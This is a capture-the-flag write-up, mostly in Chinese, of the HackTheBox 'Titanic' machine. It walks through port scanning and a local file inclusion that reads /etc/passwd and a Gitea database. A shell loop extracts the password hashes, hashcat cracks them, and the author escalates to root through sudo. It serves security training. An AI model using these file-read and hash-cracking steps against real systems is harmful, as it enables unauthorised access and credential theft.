---
title: 'HackTheBox: Titanic'
disqus: hackmd
---

HackTheBox: Titanic
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/Titanic

### Initial Enumeration

● Start Machine: `10.10.11.55`\
![image](https://hackmd.io/_uploads/B1_WsYQCyx.png)

```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.55 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 01:41 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 01:41 (0:00:01 remaining)
Nmap scan report for 10.10.11.55
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> SSH, HTTP

編輯 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts            
10.10.11.55     titanic.htb     
```
瀏覽 http://titanic.htb/\
![image](https://github.com/user-attachments/assets/9e62fb35-7062-499a-b06e-e20b52fb62bc)\
`view-source:http://titanic.htb/`:
![image](https://hackmd.io/_uploads/H1UW2Y7Ayx.png)
> POST /book
![image](https://hackmd.io/_uploads/H1O119m0kg.png)

Request 內容：
```
POST /book HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: http://titanic.htb
Connection: keep-alive
Referer: http://titanic.htb/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=CHW&email=chw%40chw.com&phone=0909099099&date=2025-04-09&cabin=Standard
```
> 送出後，下載 .json
![image](https://hackmd.io/_uploads/HkOfD5QA1g.png)

## Solution

### 1.LFI
嘗試在 `/download?ticket=` Local File Inclusion
- `/etc/passwd`
![image](https://hackmd.io/_uploads/HyvGn5mCJx.png)
> /home/developer
- `/etc/shadow`: 500 INTERNAL SERVER ERROR

>[!Tip]
>可以成功 LFI，可以直接 Get user flag ?!

### ✅ Get User Flag
> 在 `/home/developer`找到 User flag

繼續 Enumeration
- `/home/developer/.ssh/id_rsa`: 404 NOT FOUND
- `/var/log/auth.log`: 500 INTERNAL SERVER ERROR
- `/etc/hosts`
![image](https://hackmd.io/_uploads/BkqU6cQ0Je.png)
> Subdomain: `dev.titanic.htb`

編輯 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts
10.10.11.55     titanic.htb dev.titanic.htb
```
![image](https://hackmd.io/_uploads/H11I097Ckl.png)
> 發現 Gitea

### 2. Gitea
從 view-source 中發現路徑：http://dev.titanic.htb/explore/repos \
![image](https://hackmd.io/_uploads/ryeIys7C1l.png)
#### 2.1 `developer/docker-config`
- `docker-config/mysql/docker-compose.yml`
![image](https://hackmd.io/_uploads/BJ9oGiX0yl.png)
> Mysql ver: `3.8`\
> Root pwd: `MySQLP@$$w0rd!`\
> Port: `3306`
> > 但 3306 port 沒有開\
> > ![image](https://hackmd.io/_uploads/SJm-Eo7Rke.png)

- `docker-config/gitea/docker-compose.yml`
![image](https://hackmd.io/_uploads/H1ed4iQRJl.png)
> `/home/developer/gitea/data`

#### 2.2 `developer/flask-app`
- `developer/flask-app/app.py`
```py=27
ticket_id = str(uuid4())
json_filename = f"{ticket_id}.json"
json_filepath = os.path.join(TICKETS_DIR, json_filename)
```
> `ticket` 參數可控
- `developer/flask-app/tickets`
    - ` 2d46c7d1-66f4-43db-bfe4-ccbb1a5075f2.json`
    ```
    {"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
    ```
    - ` e2a629cd-96fc-4b53-9009-4882f8f6c71b.json`
    ```
    {"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
    ```

### 3. Sqlite3
嘗試從 mysql 下手，參考 [Gitea Docs](https://docs.gitea.com/administration/config-cheat-sheet)\
![image](https://hackmd.io/_uploads/S1olwiXRke.png)
> 

利用 LFI 讀取 gitea.db
- `/home/developer/gitea/data/gitea.db`: 404 NOT FOUND
- `/home/developer/gitea/data/gitea/gitea.db` 找到 DB
![image](https://hackmd.io/_uploads/BJcV_i7Ryl.png)

#### 3.1 查詢資料庫
![image](https://hackmd.io/_uploads/BkszB3XC1g.png)
```
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34
a|0b4b9295da2fe2d71ff7cc4db576ebbc8be7577c045b5d95b96d91d40ae3a0e803623e92edc4510fc25fb6e31ff549450134|49453f9360c8a09d56440a890be402dd
safeuser|e59a70b3e5243bdb5952f147952b74e0750f6c14e9f32a96828330e3b749fd88f41ab3d2fe3483f4ab90f44811648f8aa62f|7e3de1867a04c90e12eef4e44454975c
```
#### 3.2 gitea2john
gitea2john 轉換成可爆破的格式
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ gitea2john --path _home_developer_gitea_data_gitea_gitea.db > gitea.hash      
┌──(chw㉿CHW)-[~/Downloads]
└─$ cat gitea.hash 
[!]: Usage with hashcat mode (-m) 10900 for attack and specifying --username to take into account the username of the hash owners
---------------------------------------------
[+]: administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
[+]: developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
[+]: A:sha256:50000:SUU/k2DIoJ1WRAqJC+QC3Q==:C0uSldov4tcf98xNtXbrvIvnV3wEW12VuW2R1ArjoOgDYj6S7cRRD8JftuMf9UlFATQ=
[+]: safeuser:sha256:50000:fj3hhnoEyQ4S7vTkRFSXXA==:5Zpws+UkO9tZUvFHlSt04HUPbBTp8yqWgoMw47dJ/Yj0GrPS/jSD9KuQ9EgRZI+Kpi8=
---------------------------------------------
[+]: Done! Good luck!

┌──(chw㉿CHW)-[~/Downloads]
└─$ vi gitea.hash
            
┌──(chw㉿CHW)-[~/Downloads]
└─$ cat gitea.hash
sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:SUU/k2DIoJ1WRAqJC+QC3Q==:C0uSldov4tcf98xNtXbrvIvnV3wEW12VuW2R1ArjoOgDYj6S7cRRD8JftuMf9UlFATQ=
sha256:50000:fj3hhnoEyQ4S7vTkRFSXXA==:5Zpws+UkO9tZUvFHlSt04HUPbBTp8yqWgoMw47dJ/Yj0GrPS/jSD9KuQ9EgRZI+Kpi8=
```
> Hashcat 格式不符

網路上找到有人寫好的提取格式：
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ sqlite3 _home_developer_gitea_data_gitea_gitea.db "select passwd,salt,name from user" | while read data; do 
  digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)
  salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)
  name=$(echo $data | cut -d'|' -f3)
  echo "${name}:sha256:50000:${salt}:${digest}"
done | tee gitea.hash

administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
A:sha256:50000:SUU/k2DIoJ1WRAqJC+QC3Q==:C0uSldov4tcf98xNtXbrvIvnV3wEW12VuW2R1ArjoOgDYj6S7cRRD8JftuMf9UlFATQ=
safeuser:sha256:50000:fj3hhnoEyQ4S7vTkRFSXXA==:5Zpws+UkO9tZUvFHlSt04HUPbBTp8yqWgoMw47dJ/Yj0GrPS/jSD9KuQ9EgRZI+Kpi8=
```
#### 3.3 hashcat 爆破
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ hashcat gitea.hash /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7r:2528****
...
```
> `developer`:`2528****`

順利登入 Gitea:\
![image](https://hackmd.io/_uploads/Hyt2Rh701x.png)


嘗試登入 SSH:
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ ssh developer@10.10.11.55
...
developer@titanic:~$
```
> 成功登入

## Privileges Escalation

### 4. Sudo -l
```
developer@titanic:~$ sudo -l
Matching Defaults entries for developer on titanic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\

User developer may run the following commands on titanic:
    (ALL) NOPASSWD: ALL

```
> `NOPASSWD`

使用 sudo su 進到 root
```
developer@titanic:~$ sudo su
root@titanic:/home/developer# cd /root
root@titanic:~# ls
cleanup.sh  images  revert.sh  root.txt  snap
```
### ✅ Get Root FLAG


![image](https://hackmd.io/_uploads/BymUC3Q0Jl.png)

###### tags: `HTB` `Web` `CTF` 
